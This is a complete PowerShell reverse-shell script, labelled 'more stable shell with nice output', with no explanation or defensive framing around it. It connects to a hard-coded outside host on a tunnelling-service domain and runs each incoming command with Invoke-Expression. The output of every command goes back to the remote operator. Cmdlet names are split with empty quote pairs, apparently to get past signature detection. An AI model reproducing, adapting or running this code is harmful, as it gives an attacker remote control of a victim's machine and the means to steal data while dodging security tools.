<#more stable shell with nice output#>



$adfsdgv3234 = N''e''w-O''bj''e''c''t N''e''t.S''o''c''k''e''t''s.T''C''P''C''l''i''e''n''t('team-zu.gl.at.ply.gg', 14716);
$scsdvsd32 = $adfsdgv3234.GetStream();
$StreamWriter = N''ew-Ob''j''e''c''t IO.StreamWriter($scsdvsd32);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$adfsdgv3234.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL: ');
$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $scsdvsd32.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()

